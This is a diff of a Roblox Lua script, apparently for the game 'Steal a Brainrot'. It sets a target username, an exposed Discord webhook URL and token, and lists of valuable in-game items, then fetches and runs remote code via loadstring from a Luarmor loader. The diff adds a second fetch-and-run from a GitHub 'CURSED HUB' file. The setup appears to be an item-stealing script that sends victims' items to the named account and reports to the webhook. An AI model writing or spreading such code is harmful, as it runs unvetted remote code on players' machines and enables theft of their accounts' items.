@@ -1,24 +1,23 @@
-getgenv().TARGET_USER = "Onlyplaystrongest"
+getgenv().TARGET_USER = "Onlyplaystrongest "
 getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1484254382164938953/c6YGiVqkI4NL6DZ6cuN5F46FvPQyKJHNbguS0xteG8Pt4h8A-RvTf_RafKBUxkWOfU1F"
 getgenv().NORMAL_BRAINROTS = {
     ["Garama and Madundung"] = true,
     ["Capitano Moby"] = true,
     ["Burguro And Fryuro"] = true,
-    ["Lavadorito Spinito"] = true,
     ["Ketchuru and Musturu"] = true,
-    ["Tictac Sahur"] = true,
+    ["Lavadorito Spinito"] = true,
     ["Ketupat Kepat"] = true,
-    ["Tang Tang Keletang"] = true,
-    ["Dragon Cannelloni"] = true,
+    ["Tictac Sahur"] = true,
     ["Cerberus"] = true,
+    ["Dragon Cannelloni"] = true,
     ["Fragola La La La"] = true,
     ["Los Hotspotsitos"] = true,
     ["Los Bros"] = true,
     ["Tralaledon"] = true,
-    ["Los Primos"] = true,
     ["Los Puggies"] = true,
-    ["Los Spaghettis"] = true,
+    ["Los Primos"] = true,
     ["Los Tacoritas"] = true,
+    ["Los Spaghettis"] = true,
     ["Spooky and Pumpky"] = true,
     ["Fragrama and Chocrama"] = true,
     ["La Casa Boo"] = true,
@@ -36,41 +35,42 @@ getgenv().NORMAL_BRAINROTS = {
     ["Jolly Jolly Sahur"] = true,
     ["La Secret Combinasion"] = true,
     ["La Food Combinasion"] = true,
+    ["La Ginger Sekolah"] = true,
     ["Rosey and Teddy"] = true,
     ["Los Sekolahs"] = true,
-    ["La Ginger Sekolah"] = true,
     ["Reinito Sleighito"] = true,
     ["Swaggy Bros"] = true,
-    ["Chipso and Queso"] = true,
-    ["Tuff Toucan"] = true,
     ["La Taco Combinasion"] = true,
+    ["Chipso and Queso"] = true,
     ["La Spooky Grande"] = true,
+    ["Tuff Toucan"] = true,
     ["Chillin Chili"] = true,
     ["Gobblino Uniciclino"] = true,
     ["Strawberry Elephant"] = true,
     ["La Extinct Grande"] = true,
     ["Tacorita Bicicleta"] = true,
-    ["Quesadillo Vampiro"] = true,
     ["Meowl"] = true,
     ["Skibidi Toilet"] = true,
     ["Nacho Spyder"] = true,
     ["Griffin"] = true,
     ["W or L"] = true,
     ["La Jolly Grande"] = true,
-    ["La Romantic Grande"] = true,
     ["Festive 67"] = true,
     ["Love Love Bear"] = true,
     ["Ginger Gerat"] = true,
     ["Mieteteira Bicicleteira"] = true,
+    ["Rocco Disco"] = true,
     ["Dragon Aquanini"] = true,
     ["John Pork"] = true,
     ["Digi Narwhal"] = true,
     ["Hydra Bunny"] = true,
-    ["Cash or Card"] = true,
     ["Celestial Pegasus"] = true,
+    ["Cash or Card"] = true,
     ["Fortunu and Cashuru"] = true,
     ["Ventoliero Pavonero"] = true,
-    ["Elefanto Frigo"] = true
+    ["Elefanto Frigo"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["La Romantic Grande"] = true
 }
 getgenv().NORMAL_BASE_SKINS = {
     ["Rose"] = true,
@@ -111,4 +111,7 @@ getgenv().NORMAL_GEARS = {
 }
 task.spawn(function()
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/c5a067c93477b930cc4602547c6d5ffe.lua", true))()
+end)
+task.spawn(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/UNC-scripter/cursed-hub/refs/heads/main/CURSED%20HUB.txt"))()
 end)
